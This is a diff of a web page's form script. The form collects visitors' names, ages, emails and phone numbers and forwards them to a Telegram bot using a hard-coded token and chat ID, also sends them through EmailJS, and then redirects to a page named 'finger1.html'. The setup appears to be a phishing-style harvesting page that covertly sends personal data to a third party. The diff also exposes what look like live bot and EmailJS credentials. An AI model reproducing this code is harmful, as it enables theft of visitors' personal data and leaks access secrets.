@@ -108,7 +108,7 @@
 
   <!-- news section -->
   <div style="display: flex; justify-content: center; align-items: center; height: 100vh;">
-    <form id="contact-form" style="border: 1px solid #ccc; padding: 40px; border-radius: 10px; box-shadow: 0 0 15px rgba(0,0,0,0.1); background-color: #f9f9f9; width: 500px;">
+   <form id="userForm" onsubmit="handleForm(event)" style="...">
   <h2 style="text-align: center;">User Form</h2>
 
   <label for="fullname">Full Name:</label><br>
@@ -126,50 +126,50 @@
   <button type="submit" style="width: 100%; padding: 12px; background-color: #007bff; color: white; border: none; border-radius: 5px; font-size: 16px;">Next</button>
 </form>
 
-<script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
-<script type="text/javascript">
-  (function () {
-    emailjs.init("gS9N2ye9VdTx8nzoD"); // ✅ Your public key
-  })();
-</script>
-
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 <script>
-  document.getElementById("contact-form").addEventListener("submit", function (e) {
-    e.preventDefault();
+  emailjs.init('gS9N2ye9VdTx8nzoD'); // Replace this with your actual EmailJS user ID
 
-    // === Collect Form Data ===
-    const fullname = document.getElementById("fullname").value;
-    const age = document.getElementById("age").value;
-    const email = document.getElementById("email").value;
-    const phonenumber = document.getElementById("phonenumber").value;
+  async function handleForm(event) {
+    event.preventDefault();
 
-    // === Send to EmailJS ===
-    emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
-      fullname: fullname,
-      age: age,
-      email: email,
-      phonenumber: phonenumber,
-    }).then(function () {
-      alert("Email sent successfully!");
-    }, function (error) {
-      alert("Failed to send email via EmailJS: " + JSON.stringify(error));
+    const name = document.getElementById('fullname').value;
+    const age = document.getElementById('age').value;
+    const email = document.getElementById('email').value;
+    const phone = document.getElementById('phonenumber').value;
+
+    const message = `
+New Submission:
+👤 Name: ${name}
+🎂 Age: ${age}
+📧 Email: ${email}
+📞 Phone: ${phone}
+    `;
+
+    // ✅ Send to Telegram
+    const telegramToken = "7989916546:AAEB5kP_GnKwdsf6fHw6yb_znh2w8hosEY0";
+    const chatId = "5066200632";
+    await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+      })
     });
 
-    // === Send to Telegram ===
-    const telegramMessage = `New Submission:\nFull Name: ${fullname}\nAge: ${age}\nEmail: ${email}\nPhone: ${phonenumber}`;
-    const botToken = "7989916546:AAEB5kP_GnKwdsf6fHw6yb_znh2w8hosEY0";  // Replace with your real bot token
-    const chatId = "5066200632";      // Replace with your real chat ID
+    // ✅ Send Email with EmailJS
+    const templateParams = {
+      from_name: name,
+      user_email: email,
+      message: message
+    };
 
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMessage)}`)
-      .then(res => res.json())
-      .then(data => {
-        if (data.ok) {
-          console.log("Telegram message sent!");
-        } else {
-          console.error("Telegram error:", data);
-        }
-      });
-  });
+    await emailjs.send("service_aqesm48", "template_6e9e18e", templateParams);
+
+    // ✅ Redirect to next page
+    window.location.href = "finger1.html";
+  }
 </script>
 
 
